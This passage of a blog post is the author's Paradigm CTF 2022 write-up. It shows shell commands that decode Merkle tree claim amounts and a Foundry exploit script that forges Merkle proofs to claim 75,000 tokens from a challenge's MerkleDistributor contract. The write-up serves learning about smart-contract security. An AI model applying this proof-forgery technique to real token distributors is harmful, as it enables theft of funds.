+</pre><td class="rouge-code"><pre>jq <span class="nt">-r</span> <span class="s1">'.claims[].amount'</span> tree.json | <span class="k">while </span><span class="nb">read</span> <span class="nt">-r</span> line<span class="p">;</span> <span class="k">do </span>cast <span class="nt">--to-dec</span> <span class="s2">"</span><span class="nv">$line</span><span class="s2">"</span><span class="p">;</span> <span class="k">done</span> | <span class="k">while </span><span class="nb">read</span> <span class="nt">-r</span> line<span class="p">;</span> <span class="k">do </span>cast <span class="nt">--from-wei</span> <span class="s2">"</span><span class="nv">$line</span><span class="s2">"</span><span class="p">;</span> <span class="k">done</span>
+</pre></table></code></div></div><p>AND WE WERE RIGHT !!</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre><td class="rouge-code"><pre>176.426426426430638200
+1205.252196980955435126
+1012.212015703759209792
+468.013680684639052982
+1438.680735967842798774
+1096.432701108382010527
+681.817012393491087328
+993.659859843097833599
+2966.562950867434987397 // The madness at index 9!
+2124.350787947865515262
+<span class="c"># --- snip ---</span>
+</pre></table></code></div></div><p>Adding up both of the token amounts equates to eaxctly 75,000 tokens! In order to claim this we nee more information. We have the account for which we can claim, the amount that. For index, it is going to be the hash of index 37. And the proofs are going to be the proof of 37 from 1-5 index.</p><p>Index <code class="language-plaintext highlighter-rouge">95977926008167990775258181520762344592149243674153847852637091833889008632898</code></p><p>Account <code class="language-plaintext highlighter-rouge">0xd48451c19959e2D9bD4E620fBE88aA5F6F7eA72A</code></p><p>Amount <code class="language-plaintext highlighter-rouge">72033437049132565012603</code></p><p>proofs <code class="language-plaintext highlighter-rouge">0x8920c10a5317ecff2d0de2150d5d18f01cb53a377f4c29a9656785a22a680d1d</code> <code class="language-plaintext highlighter-rouge">0xc999b0a9763c737361256ccc81801b6f759e725e115e4a10aa07e63d27033fde</code> <code class="language-plaintext highlighter-rouge">0x842f0da95edb7b8dca299f71c33d4e4ecbb37c2301220f6e17eef76c5f386813</code> <code class="language-plaintext highlighter-rouge">0x0e3089bffdef8d325761bd4711d7c59b18553f14d84116aecb9098bba3c0a20c</code> <code class="language-plaintext highlighter-rouge">0x5271d2d8f9a3cc8d6fd02bfb11720e1c518a3bb08e7110d6bf7558764a8da1c5</code></p><p>After claiming this, we can claim the index 8 which will satisfy our conditions.</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+</pre><td class="rouge-code"><pre><span class="nx">contract</span> <span class="nx">ExploitScript</span> <span class="nx">is</span> <span class="nx">Script</span> <span class="p">{</span>
+    <span class="nx">Setup</span> <span class="nx">setup</span><span class="p">;</span>
+    <span class="nx">MerkleDistributor</span> <span class="nx">merkle</span><span class="p">;</span>
+
+    <span class="kd">function</span> <span class="nx">setUp</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{}</span>
+
+    <span class="kd">function</span> <span class="nx">run</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
+        <span class="nx">setup</span> <span class="o">=</span> <span class="nx">Setup</span><span class="p">(</span><span class="nx">ADDRESS_HERE</span><span class="p">);</span>
+        <span class="nx">merkle</span> <span class="o">=</span> <span class="nx">MerkleDistributor</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">setup</span><span class="p">.</span><span class="nx">merkleDistributor</span><span class="p">()));</span> 
+
+        <span class="nx">bytes32</span><span class="p">[]</span> <span class="nx">memory</span> <span class="nx">proof</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">bytes32</span><span class="p">[](</span><span class="mi">5</span><span class="p">);</span>
+        <span class="nx">proof</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x8920c10a5317ecff2d0de2150d5d18f01cb53a377f4c29a9656785a22a680d1d</span><span class="p">;</span>
+        <span class="nx">proof</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xc999b0a9763c737361256ccc81801b6f759e725e115e4a10aa07e63d27033fde</span><span class="p">;</span>
+        <span class="nx">proof</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x842f0da95edb7b8dca299f71c33d4e4ecbb37c2301220f6e17eef76c5f386813</span><span class="p">;</span>
+        <span class="nx">proof</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0e3089bffdef8d325761bd4711d7c59b18553f14d84116aecb9098bba3c0a20c</span><span class="p">;</span>
+        <span class="nx">proof</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x5271d2d8f9a3cc8d6fd02bfb11720e1c518a3bb08e7110d6bf7558764a8da1c5</span><span class="p">;</span>
+
+        <span class="nx">merkle</span><span class="p">.</span><span class="nx">claim</span><span class="p">(</span>
+            <span class="mi">95977926008167990775258181520762344592149243674153847852637091833889008632898</span><span class="p">,</span>
+            <span class="mh">0xd48451c19959e2D9bD4E620fBE88aA5F6F7eA72A</span><span class="p">,</span>
+            <span class="mi">72033437049132565012603</span><span class="p">,</span>
+            <span class="nx">proof</span>
+        <span class="p">);</span>
+
+        <span class="nx">bytes32</span><span class="p">[]</span> <span class="nx">memory</span> <span class="nx">proof2</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">bytes32</span><span class="p">[](</span><span class="mi">6</span><span class="p">);</span>
+        <span class="nx">proof2</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xe10102068cab128ad732ed1a8f53922f78f0acdca6aa82a072e02a77d343be00</span><span class="p">;</span>
+        <span class="nx">proof2</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xd779d1890bba630ee282997e511c09575fae6af79d88ae89a7a850a3eb2876b3</span><span class="p">;</span>
+        <span class="nx">proof2</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x46b46a28fab615ab202ace89e215576e28ed0ee55f5f6b5e36d7ce9b0d1feda2</span><span class="p">;</span>
+        <span class="nx">proof2</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xabde46c0e277501c050793f072f0759904f6b2b8e94023efb7fc9112f366374a</span><span class="p">;</span>
+        <span class="nx">proof2</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0e3089bffdef8d325761bd4711d7c59b18553f14d84116aecb9098bba3c0a20c</span><span class="p">;</span>
+        <span class="nx">proof2</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x5271d2d8f9a3cc8d6fd02bfb11720e1c518a3bb08e7110d6bf7558764a8da1c5</span><span class="p">;</span>
+
+        <span class="nx">merkle</span><span class="p">.</span><span class="nx">claim</span><span class="p">(</span>
+            <span class="mi">8</span><span class="p">,</span>
+            <span class="mh">0x249934e4C5b838F920883a9f3ceC255C0aB3f827</span><span class="p">,</span>
+            <span class="mi">2966562950867434987397</span><span class="p">,</span>
+            <span class="nx">proof2</span>
+        <span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</pre></table></code></div></div><h3 id="solved-after-the-ctf"><span class="mr-2">Solved after the CTF!</span><a href="#solved-after-the-ctf" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>There were few other challneges that I solved sadly after CTF ended. Will share a write-up on those too!</p><ol><li>Source code<li>Trapdooor<li>Trapdoooor<li>Vanity</ol><h3 id="wrap-up"><span class="mr-2">Wrap up!</span><a href="#wrap-up" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>This was the first ever CTF I participated in. It was a great experience &amp; frustrating at the same time as I spent a a good amount of time simply looking the code for hours! Nevertheless, it was fun &amp; we learned alot about security by breaking them.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf-write-ups/'>ctf-write-ups</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/solidity/" class="post-tag no-text-decoration" >solidity</a> <a href="/tags/evm/" class="post-tag no-text-decoration" >EVM</a> <a href="/tags/security/" class="post-tag no-text-decoration" >security</a> <a href="/tags/smart-contracts/" class="post-tag no-text-decoration" >smart contracts</a> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=My+Paradigm+CTF+2022+write-ups+-+ASJ+Blogs&url=https%3A%2F%2Fabdulsamijay.github.io%2Fposts%2Fmy-paradigm-ctf-2022-write-up%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=My+Paradigm+CTF+2022+write-ups+-+ASJ+Blogs&u=https%3A%2F%2Fabdulsamijay.github.io%2Fposts%2Fmy-paradigm-ctf-2022-write-up%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fabdulsamijay.github.io%2Fposts%2Fmy-paradigm-ctf-2022-write-up%2F&text=My+Paradigm+CTF+2022+write-ups+-+ASJ+Blogs" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/my-paradigm-ctf-2022-write-up/">My Paradigm CTF 2022 write-ups</a><li><a href="/posts/fuzzing-property-testing/">Property-based testing & fuzzing smart contracts</a><li><a href="/posts/defi-hack-analysis-poc/">Major DeFi hack analysis & POCs</a><li><a href="/posts/ethernaut-writeups/">Solutions to Ethernaut Challenges</a><li><a href="/posts/ride-to-open-source-contribution/">A Roller-Coaster Ride to Open-Source Contribution in Ethereum 2.0</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/security/">security</a> <a class="post-tag" href="/tags/solidity/">solidity</a> <a class="post-tag" href="/tags/ethereum/">ethereum</a> <a class="post-tag" href="/tags/evm/">EVM</a> <a class="post-tag" href="/tags/smart-contracts/">smart contracts</a> <a class="post-tag" href="/tags/challenge/">challenge</a> <a class="post-tag" href="/tags/client/">client</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/defi-securiry/">defi-securiry</a> <a class="post-tag" href="/tags/eth-2-0/">eth 2.0</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/ethernaut-writeups/"><div class="card-body"> <em class="small" data-ts="1653282000" data-df="ll" > May 23, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Solutions to Ethernaut Challenges</h3><div class="text-muted small"><p> Introduction Ethernaut is a wonderful website based game developed by Openzeppelin and played in Ethereum virtual machine. Each level is a smart contract that needs to be ‘hacked’. This game provi...</p></div></div></a></div><div class="card"> <a href="/posts/fuzzing-property-testing/"><div class="card-body"> <em class="small" data-ts="1650344400" data-df="ll" > Apr 19, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Property-based testing & fuzzing smart contracts</h3><div class="text-muted small"><p> Introduction Property-based testing is described as a testing philosophy which targets all types of testing including unit, acceptance &amp;amp; integration testing. It was mainly standardized and prop...</p></div></div></a></div><div class="card"> <a href="/posts/defi-hack-analysis-poc/"><div class="card-body"> <em class="small" data-ts="1657947600" data-df="ll" > Jul 16, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Major DeFi hack analysis & POCs</h3><div class="text-muted small"><p> Introduction Defi hacks have become a major target for hackers to extract the value from the protocol with very little effort &amp;amp; cost. In the web3 space it is very economically feasiblt to attac...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/defi-hack-analysis-poc/" class="btn btn-outline-primary" prompt="Older"><p>Major DeFi hack analysis & POCs</p></a><div class="btn btn-outline-primary disabled" prompt="Newer"><p>-</p></div></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/abdulsamijay">Abdul Sami J.</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/security/">security</a> <a class="post-tag" href="/tags/solidity/">solidity</a> <a class="post-tag" href="/tags/ethereum/">ethereum</a> <a class="post-tag" href="/tags/evm/">EVM</a> <a class="post-tag" href="/tags/smart-contracts/">smart contracts</a> <a class="post-tag" href="/tags/challenge/">challenge</a> <a class="post-tag" href="/tags/client/">client</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/defi-securiry/">defi-securiry</a> <a class="post-tag" href="/tags/eth-2-0/">eth 2.0</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
